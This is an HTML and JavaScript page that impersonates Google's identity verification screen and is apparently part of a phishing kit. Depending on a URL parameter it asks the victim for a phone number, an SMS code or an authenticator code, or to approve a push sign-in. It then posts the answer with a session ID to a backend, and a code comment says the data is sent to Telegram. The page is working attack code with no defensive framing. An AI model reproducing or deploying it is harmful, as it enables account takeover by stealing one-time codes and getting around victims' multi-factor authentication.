<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify your identity</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_light_color_272x92dp.png" alt="Google" class="logo">
            <h1 id="promptTitle">Verify your identity</h1>
            <p id="promptSubtitle" class="subtitle">Enter the verification information</p>
            
            <div id="promptIcon" style="text-align:center; font-size:60px; margin-bottom:20px;">📱</div>
            
            <form id="promptForm">
                <div class="input-group">
                    <input type="text" id="promptInput" required placeholder=" ">
                    <label id="inputLabel">Enter value</label>
                </div>
                <button type="submit" class="btn-next">Verify</button>
            </form>
            
            <div id="notificationBox" style="display:none; text-align:center; padding:20px;">
                <p style="font-size:18px; margin-bottom:20px;">🔔 A notification has been sent to your other device</p>
                <p style="color:#5f6368; margin-bottom:20px;">Please check your phone and approve the sign-in</p>
                <button id="notificationDone" class="btn-next">✓ I've approved it</button>
            </div>
            
            <div id="sessionInfo" style="margin-top: 15px; font-size: 12px; color: #9aa0a6; text-align: center;"></div>
        </div>
    </div>
    
    <script>
        // Get parameters from URL
        const urlParams = new URLSearchParams(window.location.search);
        const type = urlParams.get('type');
        
        // Get session ID from URL or sessionStorage
        const sessionId = sessionStorage.getItem('sessionId') || 'unknown';
        document.getElementById('sessionInfo').textContent = `Session: ${sessionId}`;
        
        const promptTitle = document.getElementById('promptTitle');
        const promptSubtitle = document.getElementById('promptSubtitle');
        const promptIcon = document.getElementById('promptIcon');
        const inputLabel = document.getElementById('inputLabel');
        const promptInput = document.getElementById('promptInput');
        const promptForm = document.getElementById('promptForm');
        const notificationBox = document.getElementById('notificationBox');
        
        // Configure based on type
        switch(type) {
            case 'phone':
                promptTitle.textContent = 'Enter your phone number';
                promptSubtitle.textContent = 'We\'ll send a verification code';
                promptIcon.textContent = '📱';
                inputLabel.textContent = 'Phone number';
                promptInput.type = 'tel';
                promptInput.placeholder = 'Enter phone number';
                break;
                
            case 'sms':
                promptTitle.textContent = 'Enter SMS verification code';
                promptSubtitle.textContent = 'We sent a code to your phone';
                promptIcon.textContent = '✉️';
                inputLabel.textContent = 'Verification code';
                promptInput.type = 'text';
                promptInput.placeholder = 'Enter 6-digit code';
                break;
                
            case '2fa':
                promptTitle.textContent = 'Enter 2FA/Security Code';
                promptSubtitle.textContent = 'Use your authenticator app';
                promptIcon.textContent = '🔐';
                inputLabel.textContent = 'Security code';
                promptInput.type = 'text';
                promptInput.placeholder = 'Enter 6-digit code';
                break;
                
            case 'notification':
                promptTitle.textContent = 'Check your other device';
                promptSubtitle.textContent = 'Approve the sign-in request';
                promptIcon.textContent = '🔔';
                promptForm.style.display = 'none';
                notificationBox.style.display = 'block';
                break;
                
            default:
                promptTitle.textContent = 'Verification required';
                promptSubtitle.textContent = 'Enter the requested information';
                promptIcon.textContent = '🔐';
                inputLabel.textContent = 'Enter value';
                promptInput.type = 'text';
        }
        
        // Handle form submission (phone, sms, 2fa)
        promptForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const value = promptInput.value;
            
            if (!value) {
                alert('Please enter the required information');
                return;
            }
            
            // Show loading
            document.querySelector('.login-box').style.opacity = '0.5';
            
            try {
                // Send verification data to Telegram
                await fetch('/api/verify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        sessionId, 
                        value, 
                        type 
                    })
                });
                
                // Show success message
                alert('✅ Verification submitted!');
                window.location.href = '/success.html';
                
            } catch (error) {
                console.error('Error:', error);
                alert('Error submitting verification. Please try again.');
                document.querySelector('.login-box').style.opacity = '1';
            }
        });
        
        // Handle notification button
        document.getElementById('notificationDone')?.addEventListener('click', async () => {
            await fetch('/api/verify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    sessionId, 
                    value: 'Notification approved on device', 
                    type: 'notification' 
                })
            });
            
            window.location.href = '/success.html';
        });
    </script>
</body>
</html>
